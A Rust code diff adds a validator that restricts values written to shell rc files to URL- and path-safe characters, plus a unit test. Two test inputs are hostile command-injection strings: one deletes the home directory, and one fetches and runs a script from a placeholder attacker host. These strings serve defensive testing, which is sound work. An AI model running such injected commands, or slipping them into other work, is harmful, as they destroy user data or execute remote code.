@@ -36,6 +36,21 @@ pub fn user_home() -> String {
     }
 }
 
+/// 校验值仅含 URL/路径安全字符，防止注入 shell rc 文件
+pub fn validate_rc_value(value: &str) -> Result<(), String> {
+    if value.is_empty() || value.len() > 2048 {
+        return Err("Value is empty or too long".to_string());
+    }
+    if value
+        .chars()
+        .all(|c| c.is_ascii_alphanumeric() || ":/._-~?&=+%#@[]".contains(c))
+    {
+        Ok(())
+    } else {
+        Err("Value contains unsafe characters (quotes, shell metacharacters)".to_string())
+    }
+}
+
 pub fn find_cmd_path(cmd: &str) -> Option<String> {
     if let Ok(p) = which::which(cmd) {
         return Some(p.to_string_lossy().to_string());
@@ -100,4 +115,18 @@ pub fn find_cmd_path(cmd: &str) -> Option<String> {
     }
 
     None
+}
+
+#[cfg(test)]
+mod tests {
+    use super::validate_rc_value;
+
+    #[test]
+    fn test_validate_rc_value() {
+        assert!(validate_rc_value("https://mirrors.tuna.tsinghua.edu.cn/homebrew/").is_ok());
+        assert!(validate_rc_value("/usr/local/bin").is_ok());
+        assert!(validate_rc_value("\"; rm -rf ~; #").is_err());
+        assert!(validate_rc_value("$(curl evil.sh|sh)").is_err());
+        assert!(validate_rc_value("").is_err());
+    }
 }
